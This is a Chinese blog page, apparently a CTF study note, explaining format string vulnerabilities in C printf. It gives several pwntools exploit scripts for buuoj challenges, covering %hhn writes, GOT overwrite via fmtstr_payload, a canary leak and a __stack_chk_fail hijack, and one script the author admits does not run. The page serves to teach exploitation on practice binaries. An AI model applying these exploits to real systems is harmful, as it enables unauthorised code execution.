@@ -1,0 +1,963 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="格式化字符串漏洞原理与利用思路, F0und">
+    <meta name="description" content="格式化字符串漏洞原理与利用思路0x00 前言参考师傅： https://www.anquanke.com/post/id/194458 64位格式化字符串漏洞修改got表利用详解
+以及：https://ctf-wiki.github.io/">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>格式化字符串漏洞原理与利用思路 | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，今天就变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        格式化字符串漏洞原理与利用思路
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-24
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.6k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        11 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="格式化字符串漏洞原理与利用思路"><a href="#格式化字符串漏洞原理与利用思路" class="headerlink" title="格式化字符串漏洞原理与利用思路"></a>格式化字符串漏洞原理与利用思路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考师傅： <a href="https://www.anquanke.com/post/id/194458" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194458</a> 64位格式化字符串漏洞修改got表利用详解</p>
+<p>以及：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/</a> ctf-wiki</p>
+<p>学习记录所用</p>
+<h2 id="0x10-漏洞原理"><a href="#0x10-漏洞原理" class="headerlink" title="0x10 漏洞原理"></a>0x10 漏洞原理</h2><p>pritnf作为c语言中的输出函数，其使用方式是填充两个参数，分别是格式化字符和变量即：printf(“格式化字符”,变量（指针、整形等变量）); 但有的人为了省事也会写成 printf(变量); 虽然都可以正常输出，但那是在正常情况下。而在不正常的情况下比如被利用时，printf(变量); 这样的写法就变得很危险了</p>
+<p>其中格式化字符有：</p>
+<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
+<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+<h2 id="0x20-漏洞利用"><a href="#0x20-漏洞利用" class="headerlink" title="0x20 漏洞利用"></a>0x20 漏洞利用</h2><p>我也是一个喜欢实际操作的人，光看理论有什么意思呢，还是要通过实践来检验真理</p>
+<p>刚好在刷buuoj，就直接拿我刚刷到的[第五空间2019 决赛]PWN5的这道题来做介绍</p>
+<p>拿到文件后我们发现，这是一个32位的程序，开启了NX保护，等下在找个64位的，先看这个吧</p>
+<p>ida反汇编主要函数:</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int a1)
+{
+  unsigned int v1; // eax
+  int fd; // ST14_4
+  int result; // eax
+  char nptr; // [esp+4h] [ebp-80h]
+  char buf; // [esp+14h] [ebp-70h]
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &unk_804C044, 4u);
+  printf("your name:");
+  read(0, &buf, 0x63u);
+  printf("Hello,");
+  printf(&buf);
+  printf("your passwd:");
+  read(0, &nptr, 0xFu);
+  if ( atoi(&nptr) == unk_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+</code></pre>
+<p>程序就一个主函数，其功能大概是：读取一个随机字符串到&amp;unk_804C044 ，然后让我们输入name,并将它打印出来，然后让我们输入密码，我们输入的密码会与&amp;unk_804C044 做对比，相等就执行system(“/bin/sh”),不等就结束。</p>
+<p>也就是说我们想要执行system(“/bin/sh”),需要让atoi(&amp;nptr) == unk_804C044，如果我们运气好，四位随机数一次性猜对，就可以取得shell了，但很明显，我运气不好。</p>
+<p>而我们的read()函数并不存在溢出，因此想要覆盖unk_804C044，就基本不太可能了，但这个时候我们发现</p>
+<pre class=" language-lang-c"><code class="language-lang-c">  printf("your name:");
+  read(0, &buf, 0x63u);
+  printf("Hello,");
+  printf(&buf);# 直接打印&buf ,导致我们可以输入%s,等这类的格式化字符串，泄露出地址
+</code></pre>
+<p>典型的格式化字符串出现了我们可以通过：</p>
+<p>填充%x来获取栈上存储的值，这里利用别人的脚本来获取一下偏移</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+
+def pianyi(pwn_name,x = 'x'):
+    print('pwn_name=' + pwn_name + ',x=' + x)
+    i = 0
+    while True :
+        r = process(pwn_name) 
+        i += 1
+        payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'
+        r.sendline(payload)
+        r.recvuntil("aaaa.")
+        r_recv = r.recv(8)
+        print('*'*10 + r_recv + '*'*10)
+        if r_recv == '61616161':
+            print(payload)
+            if x == 'x':
+                s = '%' + str(i) + '$8x'
+            else :
+                s = '%' + str(i) + '$8' + str(x)
+            return s
+            break
+
+if __name__=='__main__':
+    pianyi("./pwn")
+</code></pre>
+<p>输出：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">**********61616161**********
+aaaa.%10$8x
+</code></pre>
+<p>这里解释一下 <code>%n$x</code> 的意思是获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了，其实也就是 <code>%x</code> 的一种形式</p>
+<p>算出来偏移以后，根据我们前面介绍的知识点</p>
+<p>但根据我们前面的知识，我们就可以发现，这道题的解法不止一种</p>
+<p>1.利用%n,修改unk_804C044 中的数据，利用程序所给的system(‘/bin/sh’)，也是针对这道题的解法</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">from pwn import *
+
+io=process('./pwn')
+
+addr=0x0804C044
+
+payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
+
+payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
+
+io.sendline(payload)
+
+payload=str(0x10101010)
+
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
+<p>解释下payload:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">  read(fd, &unk_804C044, 4u);读取了四个字节到了&unk_804C044,
+</code></pre>
+<p>而根据我们前面介绍的 <code>%n</code> 的作用我们可以知道 <code>%10$hhn</code>  可以做到将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，而%n 之前打印的字符个数就是我们算的偏移量，也就是10，%后跟的数字是定位用参数位置的用的</p>
+<p>而我们的payload给到printf(&amp;buf)后会变成这个样子</p>
+<pre class=" language-lang-c"><code class="language-lang-c">printf(&unk_804C044,&unk_804C045,&unk_804C046,&unk_804C047,%10$hhn%11$hhn%12$hhn%13$hhn)
+</code></pre>
+<p>而 <code>%10$hhn</code> 所指向的地址就是&amp;unk_804C044，也就是把10赋值给了&amp;unk_804C044，同理执行完后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200317204315.png" alt=""></p>
+<p>我们可以看到，&amp;unk_804C044的值已经被我们修改为 0x10101010了，然后我们就可以getshell了。</p>
+<p>这个方法只对本题适合使用，有没有方法可以通吃呢，</p>
+<p>当然有</p>
+<p>2.泄露got表，修改函数执行</p>
+<p>原理：由于延迟绑定技术，只有在程序中执行过的函数，got中才会绑定其真实地址，所以要泄露的时漏洞之前已经执行过的函数</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">from pwn import *
+
+p=process('./pwn1')
+# p=remote('node2.buuoj.cn.wetolink.com',28910)
+elf=ELF('./pwn1')
+def debug():
+    pwnlib.gdb.attach(p)
+    pause();
+offset=10
+system_addr=0x08049080
+read_addr=elf.got['read']
+atio=elf.got['atoi']
+p.recvuntil(':')
+payload1=fmtstr_payload(offset,{atio:system_addr})
+p.sendline(payload1)
+p.recvuntil('your passwd:')
+p.sendline('/bin/sh\x00')
+'''
+p.sendline(payload1)
+p.recvuntil('Hello,')
+p.recvuntil('\x08')
+rec=u32(p.recv(4).ljust(4,'\x00'))
+log.success('rec: '+hex(rec))
+p.recvuntil('your passwd:')
+p.sendline(p32(rec))
+'''
+p.interactive()
+</code></pre>
+<p>这个脚本不是我写的，但我觉很nice，一看就懂了，特别是这行payload,</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload1=fmtstr_payload(offset,{atio:system_addr})
+</code></pre>
+<p>真就是小母牛进了公牛圈，简单明了</p>
+<h2 id="0x30-泄露Canary"><a href="#0x30-泄露Canary" class="headerlink" title="0x30 泄露Canary"></a>0x30 泄露Canary</h2><p>本次题目是BJDCTF的一道题，引发了我对格式化字符串的思考</p>
+<p>64位动态链接库文件，在 <code>0x00400626</code> 处提供了后门，且程序开启了NX与Canary保护</p>
+<p>题目源码：</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [rsp+0h] [rbp-30h]
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  read(0, &buf, 0x38uLL);
+  printf(&buf, &buf);
+  return 0;
+}
+</code></pre>
+<p>很明显程序只提供了一次输入的机会，这里先不讲如何做，下面的方法也不是做这道题的方法，只是举个例子，</p>
+<p>可以看出来，程序存在溢出以及格式化字符串漏洞，我们在这里假设一种情况，这个程序可以循环输入</p>
+<p>这个时候我们就有一个利用思路：</p>
+<p>1.通过格式化字符串泄露Canary</p>
+<p>2.通过溢出来执行后门函数</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+
+context.log_level='debug'
+
+# io=process("./r2t4")
+io=remote("node3.buuoj.cn",26701)
+
+libc=ELF("./libc-2.29.so")
+
+elf=ELF("./r2t4")
+
+main=elf.symbols['main']
+
+printf=libc.symbols['printf']
+
+printf_got=elf.got['printf']
+
+system=0x400626
+
+payload1='%11$p'
+
+io.sendline(payload1)
+
+p.recvuntil('0x')
+
+canary=int(p.recv(16),16)
+print hex(canary)
+
+payload='a'*0x28+p64(canary)+'a'*8+p64(system)
+
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
+<p>当然，exp是跑不通的，我们主要讲如何泄露Canary</p>
+<p>可以看到在我们的exp中，<code>payload1="%11$p"</code></p>
+<blockquote>
+<p>这个11是怎么来的呢？</p>
+</blockquote>
+<p>通过格式化字符串我们算出来的偏移是 <code>6</code></p>
+<p>而buf距离EBP的距离是0x30,0x30-0x8=0x28 是距离Canary的距离，因为是64位，以8 个字节为一个单位</p>
+<p>0x28/8=5 ==&gt;因此偏移为5+6=11，再详细就要自己取查看printf函数原型与64位程序的传参规律了</p>
+<p>关于这种类型的题其实也还有一个更好的例子：<a href="https://blog.csdn.net/qq_38783875/article/details/86319184" target="_blank" rel="noopener">https://blog.csdn.net/qq_38783875/article/details/86319184</a></p>
+<p>这里不多描述了</p>
+<h2 id="0x40-利用Canary"><a href="#0x40-利用Canary" class="headerlink" title="0x40 利用Canary"></a>0x40 利用Canary</h2><p>还是那道题</p>
+<p>我们没法绕过canary，也就是说我们必须从格式化字符串那里入手</p>
+<p>通过脚本，工具，或者peda里的fmtarg，我们可以算出偏移量为 <code>6</code></p>
+<p>程序开启了canary，而canary会触发栈检查，因此我们如果将栈检查的地址覆盖为程序所给出的后门地址（我试过改成main函数地址，但好像并不能实现无限循环）,然后故意触发Canary，不就getshell了</p>
+<p>1574 转化为十六进制为 0x626，也就是 backdoor 函数的后 12 bit，只需要覆盖这么多即可，$hn 后面的五个 a 是为了对齐 8 字节内存空间用的。总之这里的偏移需要自己在 gdb 中进行调试才可以确定下面</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+
+context.log_level='debug'
+
+# io=process("./r2t4")
+io=remote("node3.buuoj.cn",27328)
+
+elf=ELF("./r2t4")
+
+system=0x400626
+
+# .got.plt:0000000000601018 off_601018      dq offset __stack_chk_fail
+
+stack_ck=0x0000000000601018
+
+# fmtstr_payload(6,{stack_ck:system})
+
+# payload1='a'*(0x30-0x8-len(fmtstr_payload(6,{stack_ck:system}))) 
+
+# payload1=fmtstr_payload(6,{stack_ck:system})
+
+payload1="%1574c%8$hnaaaaa"+p64(stack_ck)
+
+payload1=payload1.ljust(0x30,"a")
+
+io.sendline(payload1)
+
+log.info("length of payload: " + str(len(payload1)))
+
+io.interactive()
+</code></pre>
+<p>剩下的等以后见到了在补充，，格式化字符串的精髓还是用好 <code>%n</code></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/03/25/ctf/pwn/fmt/" class="b-link-green">格式化字符串漏洞原理与利用思路</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/25/ctf/pwn/fastbins/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="fastbins attack 学习记录">
+                        
+                        <span class="card-title">fastbins attack 学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">fastbins attack ——Fastbin Double Free0x00 前言本篇为学习记录所用
+0x10 漏洞原理利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/ctf/pwn/qianyi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="栈迁移学习记录">
+                        
+                        <span class="card-title">栈迁移学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">栈迁移学习记录0x00 前言本篇只做学习记录整理所用
+本篇参考了：https://bbs.pediy.com/thread-258030.htm
+0x10 栈迁移原理主要看大佬的那篇图示就行了
+0x20 example[Black Watc</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">48k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
